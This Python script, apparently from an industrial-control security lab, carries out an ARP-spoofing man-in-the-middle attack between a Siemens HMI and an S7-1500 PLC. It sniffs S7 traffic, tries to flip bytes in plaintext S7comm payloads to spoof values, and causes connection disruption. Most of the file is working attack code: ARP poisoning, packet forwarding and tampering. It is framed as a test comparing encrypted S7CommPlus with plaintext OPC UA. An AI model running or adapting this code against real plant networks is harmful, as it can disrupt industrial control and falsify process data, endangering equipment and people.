#!/usr/bin/env python3
"""
tests/test_mitm_s7_spoof.py
KỊCH BẢN 5 — MITM S7comm giữa HMI (.31) và PLC (.211)

Ý tưởng (đúng thực trạng S7-1500):
  ARP spoof chen máy attacker vào giữa HMI ↔ PLC. Vì kênh WinCC ↔ PLC dùng
  S7CommPlus (mã hoá + integrity), attacker KHÔNG sửa được nội dung gói —
  script vẫn THỬ flip 1 byte payload để CHỨNG MINH điều đó (modified_count sẽ
  ~0 trên S7CommPlus). Tuy nhiên:
    - METADATA vẫn đọc được (TPKT/COTP header, hướng gói, kích thước, timing).
    - Vị trí MITM + forward kép gây DUPLICATE / TCP RETRANSMISSION /
      RECONNECT storm -> mất kết nối, drop gói liên tục (Denial of View).

Đối lập trực tiếp với tests/test_mitm_opcua_spoof.py: OPC UA plaintext ->
modified_count > 0 (sửa được); S7CommPlus mã hoá -> modified_count = 0.

MITRE ICS: T0830 Adversary-in-the-Middle, T0815 Denial of View,
           T0814 Denial of Service.

Yêu cầu: pip install scapy, chạy Admin (Windows) / sudo (Linux).
Bật IP forwarding trước:
  Windows: netsh interface ipv4 set interface "Ethernet" forwarding=enabled
  Linux:   echo 1 > /proc/sys/net/ipv4/ip_forward

Chạy (cần Admin): python tests/test_mitm_s7_spoof.py
"""

import sys
import os
import time
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.common import *  # noqa: F401,F403

try:
    from scapy.all import (
        ARP, Ether, IP, TCP, Raw,
        sendp, srp, sniff, get_if_hwaddr, getmacbyip, conf
    )
    conf.verb = 0
except ImportError:
    print("[!] Thieu scapy: pip install scapy")
    sys.exit(1)

S7_PORT = 102
DURATION = int(os.getenv("MITM_S7_DURATION_S", "60"))

stop_arp          = threading.Event()
intercepted_count = 0
modified_count    = 0
s7_classic_count  = 0   # proto byte 0x32 (S7comm cổ điển, plaintext)
s7_plus_count     = 0   # proto byte 0x72 (S7CommPlus, mã hoá)


def get_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
        return ans[0][1].hwsrc if ans else None
    except Exception:
        return None


def arp_poison(plc_mac, hmi_mac, plc_ip, hmi_ip, iface, attacker_mac):
    poison_to_hmi = Ether(dst=hmi_mac) / ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip, hwsrc=attacker_mac)
    poison_to_plc = Ether(dst=plc_mac) / ARP(op=2, pdst=plc_ip, hwdst=plc_mac, psrc=hmi_ip, hwsrc=attacker_mac)
    print(f"[ARP] Poison started: PLC={plc_ip} <-> HMI={hmi_ip}")
    while not stop_arp.is_set():
        sendp(poison_to_hmi, iface=iface, verbose=False)
        sendp(poison_to_plc, iface=iface, verbose=False)
        time.sleep(1.5)


def restore_arp(plc_mac, hmi_mac, plc_ip, hmi_ip, iface):
    fix_hmi = Ether(dst=hmi_mac) / ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip, hwsrc=plc_mac)
    fix_plc = Ether(dst=plc_mac) / ARP(op=2, pdst=plc_ip, hwdst=plc_mac, psrc=hmi_ip, hwsrc=hmi_mac)
    for _ in range(5):
        sendp(fix_hmi, iface=iface, verbose=False)
        sendp(fix_plc, iface=iface, verbose=False)
        time.sleep(0.3)
    print("[ARP] Da khoi phuc ARP table")


def decode_s7_metadata(raw: bytes):
    """Đọc metadata nhìn thấy được (không cần giải mã payload).
    TPKT(0x03 0x00) -> COTP -> S7 proto byte: 0x32=classic, 0x72=plus.
    Trả về (proto_label, s7_proto_byte) hoặc None."""
    if len(raw) < 8 or raw[0] != 0x03 or raw[1] != 0x00:
        return None
    # COTP length ở raw[4], loại ở raw[5]; payload S7 bắt đầu ~ raw[7].
    s7 = raw[7:]
    if not s7:
        return ("cotp_only", None)
    proto = s7[0]
    if proto == 0x32:
        return ("s7comm_classic", 0x32)
    if proto == 0x72:
        return ("s7comm_plus", 0x72)
    return ("other", proto)


def try_manipulate_s7(raw: bytes) -> bytes:
    """THỬ sửa nội dung. Với S7comm CỔ ĐIỂN (0x32) tìm được data item và flip;
    với S7CommPlus (0x72, mã hoá) sẽ KHÔNG khớp pattern -> trả nguyên (chứng
    minh không sửa được)."""
    global modified_count
    payload = bytearray(raw)
    meta = decode_s7_metadata(bytes(payload))
    if not meta:
        return bytes(payload)
    label, _ = meta
    if label != "s7comm_classic":
        # S7CommPlus / khác: payload mã hoá -> không thể định vị field để sửa.
        return bytes(payload)
    # Chỉ tới đây nếu là S7comm plaintext cổ điển (hiếm trên WinCC V18).
    for i in range(10, min(len(payload) - 4, 60)):
        if payload[i] == 0xFF and payload[i + 1] in (0x04, 0x09):
            j = i + 4
            if j < len(payload):
                original = payload[j]
                payload[j] ^= 0x01
                if payload[j] != original:
                    info(f"S7 classic SPOOF: byte 0x{original:02X} -> 0x{payload[j]:02X}")
                    modified_count += 1
            break
    return bytes(payload)


def packet_callback(pkt, plc_ip, hmi_ip, iface):
    global intercepted_count, s7_classic_count, s7_plus_count
    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        return
    src_ip, dst_ip = pkt[IP].src, pkt[IP].dst
    sport, dport = pkt[TCP].sport, pkt[TCP].dport
    if sport != S7_PORT and dport != S7_PORT:
        return
    intercepted_count += 1

    if pkt.haslayer(Raw):
        raw = bytes(pkt[Raw].load)
        meta = decode_s7_metadata(raw)
        if meta:
            label, _ = meta
            if label == "s7comm_classic":
                s7_classic_count += 1
            elif label == "s7comm_plus":
                s7_plus_count += 1

    # PLC -> HMI: THỬ sửa rồi forward.
    if src_ip == plc_ip and dst_ip == hmi_ip and sport == S7_PORT and pkt.haslayer(Raw):
        raw = bytes(pkt[Raw].load)
        modified = try_manipulate_s7(raw)
        new_pkt = pkt.copy()
        new_pkt[Raw].load = modified
        del new_pkt[IP].chksum
        del new_pkt[TCP].chksum
        hmi_mac = getmacbyip(hmi_ip)
        if hmi_mac:
            sendp(Ether(dst=hmi_mac) / new_pkt[IP], iface=iface, verbose=False)
        return

    # HMI -> PLC: forward nguyên.
    if src_ip == hmi_ip and dst_ip == plc_ip:
        plc_mac = getmacbyip(plc_ip)
        if plc_mac:
            sendp(Ether(dst=plc_mac) / pkt[IP], iface=iface, verbose=False)


def main():
    global intercepted_count, modified_count, s7_classic_count, s7_plus_count
    intercepted_count = modified_count = s7_classic_count = s7_plus_count = 0

    plc_ip, hmi_ip, iface = PLC_IP, HMI_IP, IFACE
    print(f"\n{B}[TEST] MITM S7COMM — HMI <-> PLC{X}")
    info(f"PLC: {plc_ip}:{S7_PORT}  HMI: {hmi_ip}  Duration: {DURATION}s")
    info("S7CommPlus mã hoá -> kỳ vọng modified_count = 0 (không sửa được nội dung)")

    observable, notes, changes = [], [], []
    error = None
    t0 = time.time()
    plc_mac = hmi_mac = None

    try:
        info("Lay MAC...")
        plc_mac = get_mac(plc_ip)
        hmi_mac = get_mac(hmi_ip)
        if not plc_mac or not hmi_mac:
            error = f"Unreachable: PLC_MAC={plc_mac} HMI_MAC={hmi_mac}"
            fail(error)
            print_result("MITM_S7_SPOOF", False, [], [], [error], time.time() - t0, error)
            return
        ok(f"PLC MAC: {plc_mac}  HMI MAC: {hmi_mac}")

        attacker_mac = get_if_hwaddr(iface)
        if sys.platform.startswith("linux"):
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        else:
            warn('Windows: xac nhan da chay "netsh ... forwarding=enabled" TRUOC lenh nay')

        th = threading.Thread(target=arp_poison, args=(plc_mac, hmi_mac, plc_ip, hmi_ip, iface, attacker_mac), daemon=True)
        th.start()
        ok("ARP Poison started")
        time.sleep(2)

        info(f"Sniffing [tcp port {S7_PORT}] for {DURATION}s ...")
        info("Wireshark filter: s7comm || s7comm-plus || arp.duplicate-address-frame")
        sniff(filter=f"tcp port {S7_PORT}", prn=lambda p: packet_callback(p, plc_ip, hmi_ip, iface),
              timeout=DURATION, store=False, iface=iface)

    except KeyboardInterrupt:
        info("Dung boi user")
    except Exception as e:
        error = str(e)
        fail(str(e))
    finally:
        stop_arp.set()
        time.sleep(1)
        if plc_mac and hmi_mac:
            try:
                restore_arp(plc_mac, hmi_mac, plc_ip, hmi_ip, iface)
            except Exception as e:
                warn(f"Restore ARP failed: {e}")
        if sys.platform.startswith("linux"):
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    duration = time.time() - t0
    observable.append(f"ARP Poison: PLC {plc_ip} <-> HMI {hmi_ip} qua attacker")
    observable.append(f"S7 intercepted: {intercepted_count} pkts")
    observable.append(f"S7comm classic (plaintext): {s7_classic_count} | S7CommPlus (encrypted): {s7_plus_count}")
    observable.append(f"S7 modified: {modified_count} pkts")

    changes.append("MITM vi tri: doc duoc METADATA; forward kep gay duplicate/retrans/reconnect (Denial of View)")

    notes.append(f"Duration: {duration:.1f}s | Intercepted: {intercepted_count} | Modified: {modified_count}")
    if modified_count == 0 and s7_plus_count > 0:
        notes.append("KET LUAN: modified=0 tren S7CommPlus -> ma hoa/integrity chan sua noi dung. "
                     "MITM chi doc metadata + gay gian doan, KHONG spoof duoc gia tri (doi lap OPC UA plaintext).")
    elif modified_count > 0:
        notes.append("Co goi S7comm CO DIEN plaintext bi sua -> phien khong ma hoa (hiem tren WinCC V18).")
    else:
        notes.append("Khong bat duoc S7CommPlus (kiem tra ARP poison co chuyen huong khong / co traffic HMI-PLC khong).")
    notes.append("Wireshark: s7comm || s7comm-plus || arp.duplicate-address-frame")

    success = intercepted_count > 0
    print_result("MITM_S7_SPOOF", success, changes, observable, notes, duration, error)


if __name__ == "__main__":
    main()
